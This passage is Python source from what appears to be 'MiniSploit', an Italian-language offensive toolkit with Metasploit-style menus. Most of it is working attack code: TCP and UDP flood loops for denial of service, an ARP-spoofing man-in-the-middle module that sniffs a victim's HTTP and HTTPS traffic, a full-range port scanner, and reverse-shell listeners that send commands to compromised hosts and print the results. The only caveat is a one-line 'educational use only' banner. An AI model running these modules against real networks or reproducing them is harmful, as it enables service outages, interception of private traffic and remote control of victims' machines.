        elif cmd.startswith("port"):
            try:
                PORT = int(cmd.split()[1])
            except ValueError:
                print(f"\033[31m[-] Porta non valida\033[0m")
        elif cmd == "start":
            start_listener()
        elif cmd == "options":
            print(f"""
LISTENER
--------
HOST = {HOST}
PORT = {PORT}
""")
        elif cmd == "help":
            print("""
Comandi disponibili:
- target <ip>
- port <porta>
- start      : Avvia listener
- options    : Mostra HOST e PORT
- exit       : Esci dal menu
- help       : Mostra questa guida
""")
        elif cmd == "exit":
            print(f"\033[31m[*] Uscita dal menu\033[0m")
            break
        else:
            print(f"\033[31m[-] Comando sconosciuto, digita help\033[0m")

def attack():
    global running, target, port
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(os.urandom(2048))
            sock.close()
        except:
            pass

def attack2():
    global target, port, running
    
    while True:
        cmd = input("(MiniSploit)/\033[36;4mDDOS > \033[0m")
        
        if cmd.startswith("target"):
            target = cmd.split()[1]
        
        elif cmd.startswith("port"):
            port = int(cmd.split()[1])
            
        elif cmd == "options":
            print(f"""
OPTIONS:
TARGET = {target}
PORT   = {port}
""")
        
        elif cmd == "run":
            if target and port:
                running = True
                for i in range(20):
                    t = threading.Thread(target=attack)
                    t.daemon = True
                    t.start()
                print("[+] Attacco partito...")
            else:
                print("[-] Devi settare target e port prima!")
                
        elif cmd == "stop":
            running = False
            print("[+] Attacco fermato.")
            
        elif cmd == "exit":
            break
            
        elif cmd == "help":
            print("""
HELP:
- target <ip>
- port <port>
- options
- run
- stop
- exit
""")
            
        else:
            print("[-] Comando non trovato, digita help per info")

def ip_to_name(ip):
    try:
        host = socket.gethostbyaddr(ip)[0]
    except socket.herror:
        host = "Unknown"
    return host

def mitm():
    global mitm_victim_ip, mitm_gateway_ip
    global mitm_victim_mac, mitm_gateway_mac
    global arp_running, probe_running, http_running, https_running
    global devices

    mitm_victim_ip = mitm_gateway_ip = None
    mitm_victim_mac = mitm_gateway_mac = None
    arp_running = probe_running = http_running = https_running = False
    devices = {}

    # --- Funzioni interne ---
    def ip_to_name(ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return "Unknown"

    def get_mac(ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, retry=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
        return None

    def arp_spoof():
        global arp_running
        print("[+] ARP Spoofing avviato...")
        while arp_running:
            pkt_v = ARP(op=2, pdst=mitm_victim_ip, psrc=mitm_gateway_ip, hwdst=mitm_victim_mac)
            pkt_g = ARP(op=2, pdst=mitm_gateway_ip, psrc=mitm_victim_ip, hwdst=mitm_gateway_mac)
            sendp(Ether(dst=mitm_victim_mac)/pkt_v, verbose=0)
            sendp(Ether(dst=mitm_gateway_mac)/pkt_g, verbose=0)
            print(f"\033[35;4m[ARP] {time.strftime('%H:%M:%S')} {ip_to_name(pkt_v.pdst)} ({pkt_v.pdst}) | "
                  f"oper={pkt_v.op} src_ip={pkt_v.psrc} dst_ip={pkt_v.pdst} "
                  f"src_mac={pkt_v.hwsrc} dst_mac={pkt_v.hwdst}\033[0m")
            time.sleep(25)

    def restore():
        print("[+] Ripristino rete...")
        sendp(Ether(dst=mitm_victim_mac)/ARP(op=2, pdst=mitm_victim_ip, psrc=mitm_gateway_ip, hwsrc=mitm_gateway_mac), count=5, verbose=0)
        sendp(Ether(dst=mitm_gateway_mac)/ARP(op=2, pdst=mitm_gateway_ip, psrc=mitm_victim_ip, hwsrc=mitm_victim_mac), count=5, verbose=0)
        print("[+] ARP table sistemata!")

    def net_probe():
        global probe_running, devices
        print("[+] Net probe avviato...")
        while probe_running:
            base_ip = ".".join(mitm_gateway_ip.split(".")[:3])
            for i in range(1, 255):
                ip = f"{base_ip}.{i}"
                mac = get_mac(ip)
                if mac and ip not in devices:
                    devices[ip] = mac
                    print(f"\033[34;4m[NET.PROBE] {time.strftime('%H:%M:%S')} Trovato dispositivo: IP={ip} MAC={mac}\033[0m")
            time.sleep(80)

    def sniff_http():
        print("[+] HTTP proxy attivo...")
        def handle(pkt):
            if pkt.haslayer(Raw):
                print(f"\033[32;4m[HTTP] {time.strftime('%H:%M:%S')} \033[34;4m{ip_to_name(pkt[IP].src)}\033[32;4m "
                      f"{pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport} » {pkt.summary()}\033[0m")
        sniff(filter=f"tcp port 80 and host {mitm_victim_ip}", prn=handle)

    def sniff_https():
        print("[+] HTTPS proxy attivo (solo metadati)...")
        def handle(pkt):
            if pkt.haslayer(Raw):
                print(f"\033[33;4m[HTTPS] {time.strftime('%H:%M:%S')} \033[34;4m{ip_to_name(pkt[IP].src)}\033[33;4m "
                      f"{pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport} » {pkt.summary()}\033[0m")
        sniff(filter=f"tcp port 443 and host {mitm_victim_ip}", prn=handle)

    # --- Loop principale ---
    while True:
        cmd = input(f"(MiniSploit)/\033[37;4mMITM > \033[0m")

        if cmd.startswith("set victim"):
            mitm_victim_ip = cmd.split()[2]
            mitm_victim_mac = get_mac(mitm_victim_ip)
            print(f"[+] MAC vittima: {mitm_victim_mac}" if mitm_victim_mac else "[-] MAC non trovato")

        elif cmd.startswith("set gateway"):
            mitm_gateway_ip = cmd.split()[2]
            mitm_gateway_mac = get_mac(mitm_gateway_ip)
            print(f"[+] MAC gateway: {mitm_gateway_mac}" if mitm_gateway_mac else "[-] MAC non trovato")

        elif cmd == "arp.spoof on":
            if mitm_victim_mac and mitm_gateway_mac:
                arp_running = True
                threading.Thread(target=arp_spoof, daemon=True).start()
            else:
                print("[-] Devi impostare victim e gateway prima!")

        elif cmd == "arp.spoof off":
            arp_running = False
            restore()

        elif cmd == "net.probe on":
            if mitm_gateway_ip:
                probe_running = True
                threading.Thread(target=net_probe, daemon=True).start()
            else:
                print("[-] Devi impostare il gateway prima!")

        elif cmd == "net.probe off":
            probe_running = False

        elif cmd == "http.proxy on":
            if mitm_victim_ip:
                http_running = True
                threading.Thread(target=sniff_http, daemon=True).start()
            else:
                print("[-] Devi impostare la vittima prima!")

        elif cmd == "https.proxy on":
            if mitm_victim_ip:
                https_running = True
                threading.Thread(target=sniff_https, daemon=True).start()
            else:
                print("[-] Devi impostare la vittima prima!")

        elif cmd in ["net.show", "options"]:
            print(f"""
OPTIONS / NET CONFIG:
Victim IP   = {mitm_victim_ip}
Gateway IP  = {mitm_gateway_ip}
Victim MAC  = {mitm_victim_mac}
Gateway MAC = {mitm_gateway_mac}
ARP Spoofing= {"ON" if arp_running else "OFF"}
NET.PROBE   = {"ON" if probe_running else "OFF"}
HTTP.PROXY  = {"ON" if http_running else "OFF"}
HTTPS.PROXY = {"ON" if https_running else "OFF"}
Dispositivi scoperti: {devices}
""")

        elif cmd == "help":
            print("""
HELP - MITM super dettagliato:
- set victim <IP>
- set gateway <IP>
- arp.spoof on/off
- net.probe on/off
- http.proxy on
- https.proxy on
- net.show / options
- help
- exit
""")

        elif cmd == "exit":
            arp_running = probe_running = http_running = https_running = False
            restore()
            break

        else:
            print("[-] Comando sconosciuto, digita 'help' per vedere i comandi")

def map():
    def start(port):
        global open_tcp
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, port)) == 0:
                open_tcp.append(port)
                print(f"[+] TCP Aperta: {port}")
            sock.close()
        except:
            pass
            
    def start2():
        global open_tcp
        print("[*] Avvio scansione porte...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
             executor.map(start, range(1, 65536))

        print("[*] Scansione TCP terminata!")
        print(f"[*] Porte aperte trovate: {open_tcp}")

    while True:
    
        cmd = input("(MiniSploit)/\033[38;5;208;4mOPENMAP \033[0m> ")
    
        if cmd.startswith("target"):
            global target
            target = cmd.split()[1]
        
        elif cmd == "start":
            try:
                start2()
            except Exception as i:
                print(f"Error: {i}")

        elif cmd == "exit":
            break
            
        elif cmd == "options":
            print(f"""
OPTIONS:
- TARGET : {target}
""")
        
        elif cmd == "help":
            print(f"""
Help - 
- options   :Opzioni
- target <ip>
- start     :Avvio
- exit      :Uscita
""")        
        
        else:
            print("Comando non trovato: Digita help per info")
            
def net():
    global port
    global target
    while True:
    
        cmd = input(f"(MiniSploit)/\033[4mnet > \033[0m")
        
        if cmd.startswith("port"):
            port = cmd.split()[1]
            
        elif cmd == "help":
            print(f"""
USAGE: 
- port <port>
- host <host>
- start (start listening)
""")
        elif cmd == "options":
            print(f"""
PORT = {port}
HOST = {target}
""")
        elif cmd.startswith("host"):
            host = cmd.split()[1]
            
            
        elif cmd == "start":
            try:
                comando = f"/home/kali/Scrivania/FULL/Malware/ATTACK/./net -lvnp {port}"
                subprocess.run(comando, shell=True)
            except Exception as e:
                print("Error: {e}")
               
        elif cmd == "exit":
            break
            
        else:
            print("Comando sconosciuto.")



def listener_cli():
    # 1. Configurazione Iniziale
    default_host = '0.0.0.0'
    default_port = 5566 # Ho messo un default per velocizzare, ma puoi toglierlo
    host = default_host
    port = default_port
    EOP_MARKER = b"!!!END_OF_OUTPUT!!!"

    print("\n Reverse Shell Listener CLI 🥳")
    print("-" * 30)
    print(f"  > Comandi: LHOST <ip> | LPORT <porta> | run | exit")
    print("-" * 30)

    # 2. Loop di Configurazione
    while True:
        # Mostra sempre lo stato corrente
        print(f"  [STATUS] LHOST: {host} | LPORT: {port}")

        try:
            user_input = input(f"(MiniSploit)/\033[34;4mListener >> \033[0m").strip()
            if not user_input:
                continue
            
            # ... (Logica di configurazione LHOST/LPORT/OPTIONS/EXIT, non modificata) ...
            parts = user_input.split()
            command = parts[0].lower()

            if command == 'lhost' and len(parts) == 2:
                host = parts[1]
                print(f"LHOST => {host}")
            
            elif command == 'lport' and len(parts) == 2:
                try:
                    new_port = int(parts[1])
                    if 1 <= new_port <= 65535:
                        port = new_port
                        print(f"LPORT => {port}")
                    else:
                        print("[ERRORE] La porta deve essere compresa tra 1 e 65535.")
                except ValueError:
                    print("[ERRORE] Inserisci un numero di porta valido.")

            elif command == 'options':
                print(f"""
OPTIONS:
LPORT = {port}
LHOST = {host}
""")

            elif command == 'run' or command == 'start':
                if not port:
                    print("[ERRORE] Imposta LPORT prima di avviare (es. LPORT 4444).")
                    continue
                print(f"\n Avvio del listener su {host}:{port}...")
                break # Esce dal loop di configurazione

            elif command == 'exit' or command == 'quit':
                print("Uscita dal programma. A presto!")
                sys.exit(0)

            else:
                print("Comando non valido. Usa: LHOST <ip>, LPORT <porta>, run/start, exit/quit.")

        except Exception as e:
            print(f"[ERRORE] Si è verificato un errore inaspettato: {e}")
            
    # 3. Funzionalità Socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((host, port))
        server_socket.listen(5) 

        while True:
            print("Waiting for a connection...")
            
            # Blocca finché non arriva una connessione
            client_socket, client_address = server_socket.accept()
            print(f"\n Connessione shell da: {client_address[0]}:{client_address[1]}")
            
            # ⭐ NOVITÀ 1: Imposta un timeout sul socket del client
            client_socket.settimeout(6.0)

            try:
                # Loop di sessione infinito
                while True:
                    prompt = f"\033[37;4m({client_address[0]}:{client_address[1]}) \033[36m$\033[0m "
                    
                    try:
                        # Prompt dell'operatore - GESTIONE INTERATTIVA
                        user_command = input(prompt)
                    except EOFError:
                        print("\n[INFO] Uscita da input.")
                        break

                    if user_command.lower() in ('quit', 'exit'):
                        client_socket.sendall(b"Closing connection...\n")
                        break
                    
                    if not user_command.strip():
                        continue

                    # 4. Invia il comando al Client
                    client_socket.sendall(user_command.encode('utf-8'))

                    # 5. Riceve l'output dal Client C (CON GESTIONE DEL BLOCCO E TIMEOUT)
                    full_output = b""
                    
                    # Ciclo per ricevere l'output fino al marcatore di fine O al timeout
                    while True:
                        try:
                            data_chunk = client_socket.recv(8192)
                            
                            if not data_chunk:
                                # Connessione chiusa dal lato remoto (il break del client ha fallito)
                                print("\n[ATTENZIONE] Connessione chiusa inaspettatamente dal client.")
                                raise ConnectionResetError("Socket remoto chiuso.")
                            
                            full_output += data_chunk
                            
                            # ⭐ NOVITÀ 2: Cerca il marcatore di fine
                            if EOP_MARKER in full_output:
                                # Output ricevuto completamente!
                                full_output = full_output.split(EOP_MARKER)[0] # Rimuovi il marcatore
                                break # Esci dal ciclo di ricezione
                            
                        except socket.timeout:
                            # 🚨 SE SCATTA IL BLOCCO! Il timeout ci fa tornare qui.
                            print("\n[INFO] Timeout di ricezione scaduto (6s). Si torna al prompt.")
                            break # Esci dal ciclo di ricezione e torna al prompt principale
                        
                        except Exception as e:
                            print(f"\n[ERRORE DI RICEZIONE] {e}")
                            break # Esci dal ciclo di ricezione

                    # Stampa l'output decodificato SOLO se abbiamo ricevuto qualcosa
                    if full_output:
                        try:
                            print(full_output.decode('utf-8', errors='ignore'))
                        except:
                             print(f"Output non decodificabile: {full_output}")

            except ConnectionResetError:
                print("Sessione terminata: Il client ha chiuso la connessione.")
                
            except Exception as e:
                print(f" Errore nella sessione del client: {e}")
            
            finally:
                client_socket.close() 
                print(f"Sessione chiusa con {client_address[0]}. In attesa di nuove...")

    except socket.error as e:
        print(f"\n Impossibile avviare il listener su {host}:{port}. Errore: {e}")
        print("Controlla che l'IP e la porta siano corretti e non siano in uso.")
        
    except KeyboardInterrupt:
        print("\n[INFO] Listener interrotto dall'utente.")
        
    except Exception as e:
        print(f" Errore grave nel server: {e}")
        
    finally:
        if 'server_socket' in locals():
            server_socket.close()
        print("\n Listener principale spento. Ciao! 👋")

def listener_complete():
    """
    Reverse Shell Listener CLI. Gestisce la configurazione (LHOST/LPORT) e la sessione.
    """
    
    # --- 1. Configurazione Iniziale ---
    default_host = '0.0.0.0'
    default_port = 54325
    host = default_host
    port = default_port
    EOP_MARKER = b"!!!END_OF_OUTPUT!!!" 

    print("\n Reverse Shell Listener CLI 🥳")
    print("-" * 35)
    print(f"  > Comandi CLI: LHOST <ip> | LPORT <porta> | run | exit")
    print("-" * 35)

    # --- 2. Loop di Configurazione CLI (RESTITUITO!) ---
    while True:

        try:
            # Qui si aspetta l'input!
            user_input = input(f"(MiniSploit)/\033[34;4mListening >> \033[0m").strip()
            if not user_input:
                continue
                
            parts = user_input.split()
            command = parts[0].lower()

            if command == 'lhost' and len(parts) == 2:
                host = parts[1]
                print(f"LHOST => {host}")
                
            elif command == 'lport' and len(parts) == 2:
                try:
                    new_port = int(parts[1])
                    if 1 <= new_port <= 65535:
                        port = new_port
                        print(f"LPORT => {port}")
                    else:
                        print("[ERRORE] La porta deve essere compresa tra 1 e 65535.")
                except ValueError:
                    print("[ERRORE] Inserisci un numero di porta valido.")

            elif command == 'options':
                print(f"""
OPTIONS:
LPORT = {port}
LHOST = {host}
""")

            elif command == 'run' or command == 'start':
                if not port:
                    print("[ERRORE] Imposta LPORT prima di avviare (es. LPORT 4444).")
                    continue
                print(f"\n Avvio del listener su {host}:{port}... 🚀")
                break # <-- Esce dal loop di configurazione per avviare il socket

            elif command == 'exit' or command == 'quit':
                print("Uscita dal programma. A presto! 👋")
                sys.exit(0)

            else:
                print("Comando non valido. Usa: LHOST <ip>, LPORT <porta>, run/start, exit/quit.")

        except Exception as e:
            print(f"[ERRORE CLI] Si è verificato un errore inaspettato: {e}")
            
    # --- 3. Funzionalità Socket (Avvio e Ascolto) ---
    # IL RESTO DEL TUO CODICE SOCKET VA QUI SOTTO, SENZA VARIAZIONI
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((host, port))
        server_socket.listen(5) 

        while True:
            print("Waiting for a connection... (Premi Ctrl+C per interrompere)")
            
            # ... (Tutto il codice della gestione della sessione socket) ...
            client_socket, client_address = server_socket.accept()
            print(f"\n 🔥 Connessione shell stabilita da: {client_address[0]}:{client_address[1]}")
            
            client_socket.settimeout(35.0)

            try:
                # Loop di sessione infinito
                while True:
                    prompt = f"\033[37;4m({client_address[0]}:{client_address[1]}) \033[36m >>\033[0m "
                    
                    try:
                        user_command = input(prompt)
                    except EOFError:
                        print("\n[INFO] Uscita forzata da input (EOF).")
                        break

                    if user_command.lower() in ('quit', 'exit'):
                        client_socket.sendall(b"exit\n") 
                        break
                        
                    if not user_command.strip():
                        continue

                    # INVIA IL COMANDO
                    client_socket.sendall(user_command.encode('utf-8'))

                    # RICEZIONE CON MARCATORE/TIMEOUT
                    full_output = b""
                    start_time = time.time()
                    
                    while True:
                        try:
                            data_chunk = client_socket.recv(8192)
                            
                            if not data_chunk:
                                print("\n[ATTENZIONE] Connessione chiusa inaspettatamente dal client.")
                                raise ConnectionResetError("Socket remoto chiuso.")
                                
                            full_output += data_chunk
                            
                            # CERCA IL MARCATORE NELL'OUTPUT RICEVUTO
                            if EOP_MARKER in full_output:
                                full_output = full_output.split(EOP_MARKER)[0] 
                                break
                                
                            # Se non è arrivato il marcatore, controllo il tempo
                            if (time.time() - start_time) > 34.8:
                                raise socket.timeout

                        except socket.timeout:
                            if full_output:
                                print("\n[ATTENZIONE] Timeout di ricezione scaduto (6s), marcatore non trovato.")
                            else:
                                print("\n[INFO] Timeout di ricezione scaduto (6s). Nessun output ricevuto.")
                            break
                        
                        except Exception as e:
                            print(f"\n[ERRORE DI RICEZIONE] {e}")
                            break

                    # Stampa l'output decodificato
                    if full_output:
                        try:
                            print(full_output.decode('utf-8', errors='ignore'))
                        except:
                            print(f"Output non decodificabile: {full_output}")

            except ConnectionResetError:
                print("Sessione terminata: Il client ha chiuso la connessione.")
                
            except Exception as e:
                print(f" Errore nella sessione del client: {e}")
                
            finally:
                client_socket.close() 
                print(f"Sessione chiusa con {client_address[0]}. In attesa di nuove...")

    except socket.error as e:
        print(f"\n 🚨 Impossibile avviare il listener su {host}:{port}. Errore: {e}")
        
    except KeyboardInterrupt:
        print("\n[INFO] Listener interrotto dall'utente. Ciao! 👋")
        
    finally:
        if 'server_socket' in locals():
            server_socket.close()
        print("\n Listener principale spento.")


def telnet_attack():
    port = 23
    host = None
    while True:
    
        cmd = input("Telnet > ")
        
        if cmd.startswith("host"):
            host = cmd.split()[1]
            
        elif cmd == "exit":
            break
            
        elif cmd == "show":
            print(f"""
Show =>
HOST: {host}
PORT: {port}
""")

        elif cmd == "help":
            print(f"""
Help: Usage:
- host <ip host>
- show (Mostra Opzioni)
- help (Mostra questo messaggio)
- exit (Torn a MiniSploit)
- start (Avvia attacco)
""")
            
        elif cmd == "start":
            try:
                comando = f"telnet {host}"
                subprocess.run(comando, shell=True)
            except Exception as r:
                print(f"[ERROR] {r}")
        else:
            print("Comando sconosciuto")
    
def protocoll_u():
    host = None
    port = None
    sock = None
    byte = None
    while True:
        
        cmd = input("(DoS-UDP) $ ")
        
        if cmd.startswith("host"):
            host = cmd.split()[1]
            
        elif cmd.startswith("byte"):
            byte = int(cmd.split()[1])
            
        elif cmd.startswith("port"):
            port = int(cmd.split()[1]) 
            
        elif cmd == "start":
            if host and port:
                try:
                    dati_ca = os.urandom(byte) 
                except TypeError as e:
                # Cattura l'errore se 'byte' non è un intero (es. se fosse None)
                    print(f"[Errore] Impossibile creare i dati casuali. Byte è {byte}. Errore: {e}")
                    continue # Esci dal tentativo di start
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    print(f"Tentativo di connessione a: {host}/{port}")
                    
                    i = 0 
                    while True:
                        i += 1
                        sock.sendto(dati_ca, (host, port))
                        
                        if i % 1000 == 0:
                            print(f"Pacchetti inviati UDP..... {host}:{port}")
                except Exception as a:
                    print(f"[Error {a}]")
                    
                finally:
                    if sock:
                        sock.close()
                        print("Chiuso")
                        
        elif cmd == "help":
            print(f"""

HELP = 
- start (avvio Dos)
- show  (vedi opzioni)
- help 
- exit
- host <HOST>
- port <PORT>
""")

        elif cmd == "show":
            print(f"""
SHOW == 
HOST - {host}
PORT - {port}
""")

        elif cmd == "exit":
            break
        else:
            print("Comando sconoscuto") 
   
def ftp_connect():
    port = 21
    host = None
    while True:
    
        cmd = input("(MiniSploit)/FTP >")
    
        if cmd.startswith("host"):
            host = cmd.split()[1]
        
        elif cmd == "show":
            print(f"""
Show => 
Host: {host}
Port: {port}
""")
    
        elif cmd == "exit":
            break
                
        elif cmd == "start":
            try:
                comando = f"ftp {host}"
                print(f"il comando e: ftp {host}")
                subprocess.run(comando, shell=True)
            except Exception as e:
                print(f"[ERROR] {e}")

def shell_inversa():
    while True:
        
        cmd = input("Shell_inversa > ")
        
        if cmd.startswith("use"):
            try:
                modulo2 = cmd.split()[1]
                if modulo2 == "reverse_shell":
                    main()
                elif modulo2 == "nc":
                    nc()
                elif modulo2 == "shell":
                    mega_menu()
                elif modulo2 == "net":
                    net()
                elif modulo2 == "listener":
                    listener_cli()
                elif modulo2 == "listen":
                    listener_complete()
            except Exception as e:
                print("[Error] - [{e}]")
        elif cmd == "quit":
            break
            
        elif cmd == "help":
            print("""
Help - 
- quit   [exit prompt]
- use    [modulo]
- help   [questo messaggio]
- modulo [vedi moduli esistenti]
""")
        elif cmd == "modulo":
            print("""
MODULI ===
- reverse_shell
- net (netcat)
- nc
- shell
- listener
- listen
""")
        else:
            print("Modulo non trovato")
            
def Denial_of_service():
    while True:
        
        cmd = input("Denial_of_Service > ")
        
        if cmd.startswith("use"):
            try:
                modulo2 = cmd.split()[1]
                if modulo2 == "dos":
                    menu()
                elif modulo2 == "ddos":
                    attack2()
                elif modulo2 == "prompt_dos":
                    menu_dos()
                elif modulo2 == "SlowLoris":
                    slowdos()
                elif modulo2 == "Hammer":
                    hammer()
                elif modulo2 == "Deauth":
                    Denial()
                elif modulo2 == "dos-udp":
                    protocoll_u()
            except Exception as e:
                print("[Error] - [{e}]")
        elif cmd == "help":
            print("""
Help - 
- quit   [exit prompt]
- use    [modulo]
- help   [questo messaggio]
- modulo [vedi moduli esistenti]
""")
        elif cmd == "modulo":
            print("""
MODULI ===
- dos
- ddos
- prompt_dos
- Slowloris
- Hammer
- Deauth
- dos-udp
""")
        elif cmd == "quit":
            break
        else:
            print("Modulo non trovato")
            
def Auxiliary_Ping():
    while True:
        cmd = input("Auxiliary_Ping > ")
        
        if cmd.startswith("use"):
            try:
                modulo2 = cmd.split()[1]
                if modulo2 == "ausiliary":
                    menu()
            except Exception as e:
                print("[Error] - [{e}]")
        elif cmd == "help":
            print("""
Help - 
- quit   [exit prompt]
- use    [modulo]
- help   [questo messaggio]
- modulo [vedi moduli esistenti]
""")
        elif cmd == "modulo":
            print("""
MODULI ===
- ausiliary
""")

        elif cmd == "quit":
            break
        else:
            print("Modulo non trovato")
            
def Man_in_the_Middle():
    while True:
        cmd = input("Man_In_The_Middle > ")
        
        if cmd.startswith("use"):
            try:
                modulo2 = cmd.split()[1]
                if modulo2 == "mitm":
                    mitm()
            except Exception as e:
                print("[Error] - [{e}]")
        elif cmd == "quit":
            break
        elif cmd == "help":
            print("""
Help - 
- quit   [exit prompt]
- use    [modulo]
- help   [questo messaggio]
- modulo [vedi moduli esistenti]
""")
        elif cmd == "modulo":
            print("""
MODULI ===
- mitm
""")
        else:
            print("Modulo non trovato")

def Scan_map():
    while True:
        cmd = input("Scan_Map > ")
        
        if cmd.startswith("use"):
            try:
                modulo2 = cmd.split()[1]
                if modulo2 == "openmap":
                    map()
            except Exception as e:
                print("[Error] - [{e}]")
        elif cmd == "quit":
            break
        elif cmd == "help":
            print("""
Help - 
- quit   [exit prompt]
- use    [modulo]
- help   [questo messaggio]
- modulo [vedi moduli esistenti]
""")
        elif cmd == "modulo":
            print("""
MODULI ===
- openmap
""")
        else:
            print("Modulo non trovato")
           
def Telnet_attack():
    while True:
        cmd = input("Telnet_attack > ")
        
        if cmd.startswith("use"):
            try:
                modulo2 = cmd.split()[1]
                if modulo2 == "telnet":
                    telnet_attack()
            except Exception as e:
                print("[Error] - [{e}]")
        elif cmd == "quit":
            break
        elif cmd == "help":
            print("""
Help - 
- quit   [exit prompt]
- use    [modulo]
- help   [questo messaggio]
- modulo [vedi moduli esistenti]
""")
        elif cmd == "modulo":
            print("""
MODULI ===
- telnet
""")
        else:
            print("Modulo non trovato")

def File_TP():
    while True:
        cmd = input("File_Transfert_Protocoll_Attack > ")
        
        if cmd.startswith("use"):
            try:
                modulo2 = cmd.split()[1]
                if modulo2 == "ftp_attack":
                    ftp_connect()
            except Exception as e:
                print("[Error] - [{e}]")
        elif cmd == "help":
            break
        elif cmd == "help":
            print("""
Help - 
- quit   [exit prompt]
- use    [modulo]
- help   [questo messaggio]
- modulo [vedi moduli esistenti]
""")
        elif cmd == "modulo":
            print("""
MODULI ===
- ftp_attack
""")
        else:
            print("Modulo non trovato")
            
def Brute_frocing_Attack():
    while True:
        cmd = input("Brute_Force_Attack > ")
        
        if cmd.startswith("use"):
            try:
                modulo2 = cmd.split()[1]
                if modulo2 == "bruteshell":
                    try:
                        BruteForceShell().cmdloop()
                    except KeyboardInterrupt:
                        print("\nArrivederci! Buon studio! 👋")
                        sys.exit(0)
            except Exception as e:
                print("[Error] - [{e}]")
        elif cmd == "quit":
            break
        elif cmd == "help":
            print("""
Help - 
- quit   [exit prompt]
- use    [modulo]
- help   [questo messaggio]
- modulo [vedi moduli esistenti]
""")
        elif cmd == "modulo":
            print("""
MODULI ===
- bruteshell
""")
        else:
            print("Modulo non trovato")
             
def main_menu():
    # Ho corretto l'indentazione della funzione e allineato 'while True' a 4 spazi.
    print(f"""
\033[34mMM             MM             \033[31m######################
\033[34mMMMMM       MMMMM             \033[31m########       #######      
\033[34mMMMMMMMMmmMMMMMMM             \033[31m######    ######  ####
\033[34mMMMMMMMMMMMMMMMMM             \033[31m#####    #############
\033[34mMMMMM MMMM  MMMMM             \033[31m#######        #######
\033[34mMMMMM       MMMMM             \033[31m###########      #####
\033[34mMMMMM       MMMMM             \033[31m############     #####
\033[34mMMMMM       MMMMM\033[0m @@ ###  # @@\033[31m############     #####       
\033[34m?MMMM       MMMM?\033[0m @@ ## # # @@\033[31m###   #####      #####\033[0m $$$$$$$ $$    &&&&&&  @@ &&&&&&&&
\033[34m`?MMM       MMM?`\033[0m @@ ## # # @@\033[31m###           ########\033[0m $$   $$ $$    &&  &&  @@    &&
\033[34m  ?MM       MM?  \033[0m @@ ##  ## @@\033[31m######################\033[0m $$$$$$$ $$$$$ &&&&&&  @@    &&
                                                     $$   
                                                     $$
                                                      
\033[37mMINISPLOIT - created by Manu and Paty - \033[37;4mUsare questo script solo a scopo educativo\033[0m
\033[0m""")
    
    # Inizio del loop principale della shell (indentato correttamente)
    while True:
        cmd2 = input(f"(\033[1;34mM\033[0;1mini\033[1;31mS\033[0;1mploit\033[0m) > ")
        
        # --- Comando term ---
        if cmd2.startswith("term "):
            system_cmd = cmd2[len("term "):]
            try:
                # Esegui il comando di sistema e stampa l'output
                result = subprocess.run(system_cmd.split(), capture_output=True, text=True, check=False)
                print(result.stdout.strip() if result.stdout else result.stderr.strip())
            except FileNotFoundError:
                print(f"[-] ERRORE: Comando '{system_cmd.split()[0]}' non trovato.")
            except Exception as e:
                print(f"[-] ERRORE: {e}")

        # --- Comando use ---
        elif cmd2.startswith("use"):
            try:
                modulo = cmd2.split()[1]
                if modulo == "brute/forcing":
                    Brute_frocing_Attack()
                elif modulo == "ftp/attack":
                    File_TP()
                elif modulo == "telnet/attack":
                    Telnet_attack()
                elif modulo == "scan/map":
                    Scan_map()
                elif modulo == "Man/middle":
                    Man_in_the_Middle()
                elif modulo == "auxiliary/attack":
                    Auxiliary_Ping()
                elif modulo == "D_of_Service":
                    Denial_of_service()
                elif modulo == "Shells":
                    shell_inversa()
                else:
                    print("Modulo non trovato")
            except IndexError:
                    print("Modulo non valido. Usare help per info") 

        # --- Comando exit ---
        elif cmd2 == "exit":
            print("A presto! Buon studio! 👋")
            break

        # --- Comando help ---
        elif cmd2 == "help":
            print(f"""
=============================================================|
USAGE:
- use <modulo>  : Carica un modulo.
- exit          : Esce da MiniSploit.
- help          : Mostra questa guida.
- term <comando>: Esegue un comando shell del sistema operativo.
=============================================================|
MODULES ---
- C2                    [ 5 moduli ]
- DOS                   [ 7 moduli ]
- AUXILIARY             [ 1 modulo ]
- FTP                   [ 1 modulo ]
- TELNET                [ 1 modulo ]
- SCAN PORT             [ 1 modulo ]
- MAN IN THE MIDDLE     [ 1 modulo ]
- BRUTE FORCE           [ 1 modulo ]
=============================================================|
USAGE:
- use [brute/forcing] [ftp/attack] [telnet/attack] [scan/map] 
[Man/middle] [auxiliary/attack] [D_of_Service] [Shells] 
=============================================================|
""")

        # --- Comando clear ---
        elif cmd2 == "clear":
            os.system("clear")

        # --- Comando non riconosciuto ---
        else:
            print("[-] ERRORE: Comando non trovato. Digita 'help' per la guida.")

		 
if __name__ == "__main__":
    main_menu()

